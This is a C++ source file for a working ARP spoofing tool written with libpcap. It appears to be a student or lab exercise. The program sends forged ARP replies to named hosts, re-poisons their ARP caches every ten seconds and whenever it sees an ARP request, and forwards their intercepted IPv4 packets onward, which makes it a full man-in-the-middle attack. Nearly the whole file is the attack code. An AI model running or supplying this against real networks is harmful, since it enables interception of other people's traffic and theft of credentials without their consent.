#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if.h>

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

pcap_t *handle;
char *dev;
Mac MyMac;

pthread_mutex_t send_mutex;
pthread_mutex_t recv_mutex;

struct ArpArgs
{
	Ip sender_ip;
	Ip target_ip;
	Mac sender_mac;
	Mac target_mac;
};

void usage();
Mac GetMyMac();
Mac GetMacByIp(Ip);
void ArpSpoofing(void *);
void *PeriodicInfection(void *);
void RelayPacket(void *, const u_char *);

int main(int argc, char *argv[])
{
	if (argc < 4 || argc % 2 == 1)
	{
		usage();
		return -1;
	}

	// Interface & get my mac address
	dev = argv[1];
	MyMac = GetMyMac();

	// Attack Count
	int cnt = argc / 2 - 1;
	ArpArgs attack[cnt];

	// Handl Initialize
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// Parsing start
	for (int iter = 0; iter < cnt; iter++)
	{
		attack[iter].sender_ip = Ip(argv[2 * (iter + 1)]);
		attack[iter].target_ip = Ip(argv[2 * (iter + 1) + 1]);

		attack[iter].sender_mac = GetMacByIp(attack[iter].sender_ip);
		attack[iter].target_mac = GetMacByIp(attack[iter].target_ip);

	}

	// Periodic reinfection
	printf("###Periodic Reinfection Attack Started###\n\n");
	
	pthread_t tid[cnt];
	for (int iter = 0; iter < cnt; iter++)
	{

		if (pthread_create(&tid[iter], NULL, PeriodicInfection, &attack[iter]) != 0)
		{
			printf("Failed to create thread\n");
			return 1;
		}
	}

	// Non-Periodic reinfection
	printf("###Non Periodic Reinfection Attack Started###\n\n");

	struct pcap_pkthdr *header;
	const u_char *recvpacket;

	while (true)
	{
	
		pthread_mutex_lock(&recv_mutex);
		int res = pcap_next_ex(handle, &header, &recvpacket);
		pthread_mutex_unlock(&recv_mutex);


		
		if (res == 0)
			continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *eth_hdr = (EthHdr *)recvpacket;
		

		if (eth_hdr->type() == EthHdr::Arp) // ARP Broadcasting Detected
		{
			ArpHdr *arp_hdr = (ArpHdr *)(recvpacket + sizeof(struct EthHdr));
			for (int i = 0; i < cnt; i++)
			{
				if (arp_hdr->op() == ArpHdr::Request &&
						(arp_hdr->sip() == attack[i].sender_ip && arp_hdr->tip() == attack[i].target_ip ||
						 arp_hdr->sip() == attack[i].target_ip && arp_hdr->tip() == attack[i].sender_ip))
				{
					ArpSpoofing(&attack[i]);
				}
			}
		} 
		else if (eth_hdr->type() == EthHdr::Ip4)
		{
			for (int i = 0; i < cnt; i++)
			{
				if (eth_hdr->smac() == attack[i].sender_mac)
				{
				
				
					eth_hdr->dmac_ = attack[i].target_mac;
					eth_hdr->smac_ = MyMac;					
				
					pthread_mutex_lock(&send_mutex);
					res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(recvpacket), header->caplen);
					pthread_mutex_unlock(&send_mutex);

					if (res != 0)
					{
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}
			}
		}
	}

	for (int i = 0; i < cnt; ++i)
	{
		pthread_join(tid[i], NULL);
	}

	pcap_close(handle);
	return 0;
}

void usage()
{
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac GetMyMac()
{
	struct ifreq ifr;
	int sk = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, dev);

	int ret = ioctl(sk, SIOCGIFHWADDR, &ifr);

	return Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
}

Mac GetMacByIp(Ip ip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = MyMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = MyMac;
	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
	packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.arp_.tip_ = htonl(ip);

	pthread_mutex_lock(&send_mutex);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	pthread_mutex_unlock(&send_mutex);

	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	struct pcap_pkthdr *header;
	const u_char *recvpacket;

	while (true)
	{
		pthread_mutex_lock(&recv_mutex);
		res = pcap_next_ex(handle, &header, &recvpacket);
		pthread_mutex_unlock(&recv_mutex);

		if (res == 0)
			continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *eth_hdr = (EthHdr *)recvpacket;

		if (eth_hdr->type() == EthHdr::Arp)
		{
			ArpHdr *arp_hdr = (ArpHdr *)(recvpacket + sizeof(struct EthHdr));

			if (arp_hdr->op() == ArpHdr::Reply && arp_hdr->sip() == ip)
			{
				// Success!!!
				return arp_hdr->smac();
				break;
			}
		}
	}
	return Mac("00:00:00:00:00:00");
}

void ArpSpoofing(void *AttackArgs)
{
	ArpArgs *attack = (ArpArgs *)AttackArgs;

	EthArpPacket packet;

	packet.eth_.dmac_ = attack->sender_mac;
	packet.eth_.smac_ = MyMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = MyMac;
	packet.arp_.sip_ = htonl(attack->target_ip);
	packet.arp_.tmac_ = MyMac;
	packet.arp_.tip_ = htonl(attack->sender_ip);

	pthread_mutex_lock(&send_mutex);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	pthread_mutex_unlock(&send_mutex);

	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void *PeriodicInfection(void *AttackArgs)
{
	while (true)
	{
		ArpSpoofing(AttackArgs);
		sleep(10);
	}
	return NULL;
}
